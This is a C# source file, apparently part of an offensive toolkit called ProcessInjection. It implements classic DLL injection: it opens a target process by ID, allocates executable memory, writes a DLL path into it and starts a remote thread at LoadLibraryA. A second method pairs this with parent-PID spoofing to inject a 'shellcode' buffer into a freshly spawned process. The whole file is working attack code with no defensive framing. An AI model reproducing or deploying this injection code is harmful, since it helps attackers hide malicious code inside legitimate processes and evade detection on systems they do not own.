using System;
using static ProcessInjection.Native.Win32API;
using static ProcessInjection.Native.Enum;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Utils.Utils;
using System.Runtime.InteropServices;
using ProcessInjection.Native;

namespace ProcessInjection.PInvoke
{
    public class DLLInjection
    {
        public static void DLLInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
                PrintInfo($"[!] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");
                PrintInfo($"[!] Allocating memory for the DLL path.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                PrintInfo($"[!] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");
                PrintInfo($"[!] Writing the DLL path at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    PrintInfo($"[!] DLL path written in the target process memory.");
                    PrintInfo($"[!] Creating remote thread to execute the DLL.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    PrintSuccess($"[+] Sucessfully injected the DLL into the memory of the process id {pid}.");
                }
                else
                {
                    PrintError($"[-] Failed to write the DLL into the memory of the process id {pid}.");
                }
                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }
        }

        public static void PPIDDLLInject(string binary, byte[] shellcode, int parentpid)
        {
            PPIDSpoofing Parent = new PPIDSpoofing();
            PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
            DLLInject(pinf.dwProcessId, shellcode);
        }
    }
}
